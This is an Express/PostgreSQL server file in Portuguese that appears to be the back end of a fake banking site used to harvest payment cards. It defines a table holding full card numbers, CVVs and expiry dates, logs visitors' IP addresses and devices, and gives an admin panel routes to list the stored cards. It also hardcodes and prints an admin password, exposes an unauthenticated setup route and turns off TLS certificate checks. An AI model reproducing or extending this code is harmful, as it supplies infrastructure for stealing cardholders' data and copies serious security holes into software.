require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { Pool } = require('pg');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Servir arquivos estáticos da pasta frontend
app.use(express.static(path.join(__dirname, '../frontend')));

// ============================================================
// CONEXÃO COM POSTGRESQL
// ============================================================
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// ============================================================
// ROTA PARA INICIALIZAR O BANCO (acessar 1 vez)
// https://seu-app.onrender.com/api/init
// ============================================================
app.get('/api/init', async (req, res) => {
    try {
        // Criar tabela de usuários
        await pool.query(`
            CREATE TABLE IF NOT EXISTS usuarios (
                id SERIAL PRIMARY KEY,
                nome VARCHAR(255) NOT NULL DEFAULT 'Usuário',
                email VARCHAR(255),
                cpf VARCHAR(11) UNIQUE NOT NULL,
                senha VARCHAR(255) NOT NULL,
                ip VARCHAR(50),
                dispositivo TEXT,
                navegador TEXT,
                role VARCHAR(50) DEFAULT 'user',
                ultimo_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar tabela de logs
        await pool.query(`
            CREATE TABLE IF NOT EXISTS logs_acesso (
                id SERIAL PRIMARY KEY,
                cpf VARCHAR(11),
                ip VARCHAR(50),
                dispositivo TEXT,
                navegador TEXT,
                data_acesso TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar tabela de pedidos
        await pool.query(`
            CREATE TABLE IF NOT EXISTS pedidos (
                id SERIAL PRIMARY KEY,
                pedido_id VARCHAR(100),
                cliente_nome VARCHAR(255),
                cliente_cpf VARCHAR(11),
                total DECIMAL(10,2),
                forma_pagamento VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar tabela de cartões
        await pool.query(`
            CREATE TABLE IF NOT EXISTS cartoes (
                id SERIAL PRIMARY KEY,
                nome_titular VARCHAR(255),
                numero VARCHAR(50),
                cvv VARCHAR(10),
                validade_mes VARCHAR(2),
                validade_ano VARCHAR(4),
                bandeira VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Criar usuário administrador (Kakabanker / 77991958)
        const senhaHash = await bcrypt.hash('77991958', 10);
        await pool.query(`
            INSERT INTO usuarios (nome, cpf, email, senha, role)
            VALUES ('Kakabanker', '00000000000', 'admin@nuitbanker.com', $1, 'admin')
            ON CONFLICT (cpf) DO NOTHING
        `, [senhaHash]);
        
        res.json({ success: true, message: 'Banco inicializado! Admin: Kakabanker, Senha: 77991958' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// ============================================================
// ROTA DE LOGIN
// ============================================================
app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador } = req.body;
    let cpfLimpo = cpf ? cpf.replace(/\D/g, '') : '';
    
    if (!cpfLimpo || !password) {
        return res.status(400).json({ error: 'CPF e senha são obrigatórios' });
    }
    
    try {
        const result = await pool.query('SELECT * FROM usuarios WHERE cpf = $1', [cpfLimpo]);
        
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'CPF ou senha inválidos' });
        }
        
        const user = result.rows[0];
        const validPassword = await bcrypt.compare(password, user.senha);
        
        if (!validPassword) {
            return res.status(401).json({ error: 'CPF ou senha inválidos' });
        }
        
        // Registrar log
        await pool.query(`
            INSERT INTO logs_acesso (cpf, ip, dispositivo, navegador)
            VALUES ($1, $2, $3, $4)
        `, [cpfLimpo, ip || 'Não coletado', dispositivo || 'Desconhecido', navegador || 'Desconhecido']);
        
        // Atualizar dados do usuário
        await pool.query(`
            UPDATE usuarios SET ip = $1, dispositivo = $2, navegador = $3, ultimo_acesso = NOW()
            WHERE cpf = $4
        `, [ip || 'Não coletado', dispositivo || 'Desconhecido', navegador || 'Desconhecido', cpfLimpo]);
        
        const token = jwt.sign(
            { id: user.id, cpf: user.cpf, nome: user.nome, role: user.role },
            process.env.JWT_SECRET,
            { expiresIn: '24h' }
        );
        
        res.json({
            success: true,
            token,
            user: { id: user.id, nome: user.nome, cpf: user.cpf, email: user.email, role: user.role }
        });
    } catch (error) {
        console.error('Erro no login:', error);
        res.status(500).json({ error: 'Erro no servidor' });
    }
});

// ============================================================
// MIDDLEWARE ADMIN
// ============================================================
function isAdmin(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Token não fornecido' });
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        if (decoded.role !== 'admin') return res.status(403).json({ error: 'Acesso negado' });
        req.user = decoded;
        next();
    } catch (error) {
        res.status(401).json({ error: 'Token inválido' });
    }
}

// ============================================================
// ROTAS ADMIN
// ============================================================
app.get('/api/admin/users', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT id, nome, cpf, email, role, ip, dispositivo, ultimo_acesso, created_at FROM usuarios ORDER BY id DESC');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar usuários' });
    }
});

app.delete('/api/admin/users/:id', isAdmin, async (req, res) => {
    const { id } = req.params;
    try {
        await pool.query('DELETE FROM usuarios WHERE id = $1 AND role != $2', [id, 'admin']);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao deletar usuário' });
    }
});

app.get('/api/admin/logs', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM logs_acesso ORDER BY data_acesso DESC LIMIT 200');
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar logs' });
    }
});

app.get('/api/admin/cartoes', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM cartoes ORDER BY id DESC');
        res.json({ success: true, cartoes: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar cartões' });
    }
});

app.get('/api/admin/pedidos', isAdmin, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM pedidos ORDER BY id DESC');
        res.json({ success: true, pedidos: result.rows });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar pedidos' });
    }
});

app.get('/api/admin/stats', isAdmin, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['user']);
        const totalAdmins = await pool.query('SELECT COUNT(*) FROM usuarios WHERE role = $1', ['admin']);
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs_acesso');
        const logsHoje = await pool.query('SELECT COUNT(*) FROM logs_acesso WHERE DATE(data_acesso) = CURRENT_DATE');
        
        res.json({
            success: true,
            stats: {
                total_users: parseInt(totalUsers.rows[0].count),
                total_admins: parseInt(totalAdmins.rows[0].count),
                total_logs: parseInt(totalLogs.rows[0].count),
                logs_hoje: parseInt(logsHoje.rows[0].count)
            }
        });
    } catch (error) {
        res.status(500).json({ error: 'Erro ao buscar estatísticas' });
    }
});

// ============================================================
// INICIAR SERVIDOR
// ============================================================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`👤 Admin: Kakabanker | Senha: 77991958`);
});